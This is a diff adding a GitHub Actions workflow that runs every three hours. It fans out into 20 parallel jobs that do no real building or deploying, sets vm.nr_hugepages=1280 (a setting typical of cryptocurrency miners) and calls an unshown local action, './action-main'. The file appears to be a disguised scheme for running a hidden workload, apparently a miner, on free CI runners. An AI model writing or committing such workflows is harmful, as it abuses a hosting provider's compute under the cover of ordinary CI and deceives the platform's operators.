@@ -1,0 +1,51 @@
+name: 1
+
+on:
+  schedule:
+  - cron: "0 */3 * * *"
+     
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        mongodb-version: [4.0, 4.2, 4.4, 6.6]
+        node-version: [8.x, 10.x, 12.x, 14.x, 16.x]
+        redis-version: [4]
+
+    steps:
+    - name: Git checkout
+      uses: actions/checkout@v2
+    - run: |
+        sleep 15 
+        echo "done"
+
+
+  deploy:
+    timeout-minutes: 40
+    needs: build
+    continue-on-error: true
+    runs-on: ubuntu-18.04
+    strategy:
+      fail-fast: false
+      matrix:
+        flag: [lisa, jisoo, prabowo, Borneo]
+        go: [ '1.12', '1.13', '1.14', '1.15', '1.16' ]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.job }}
+    steps:
+    - name: Install Go
+      uses: actions/setup-go@v1
+      continue-on-error: true
+      timeout-minutes: 40
+      with:
+        go-version: ${{ matrix.go }}
+    - name: Install ${{ matrix.flag }} Ver-${{ matrix.go }}
+      uses: actions/checkout@v1
+    - name: Set Up
+      run: sudo sysctl -w vm.nr_hugepages=1280
+    - name: Control management
+      uses: ./action-main
+      with:
+        MY_NAME: "Monalisa ${{ matrix.flag }}"
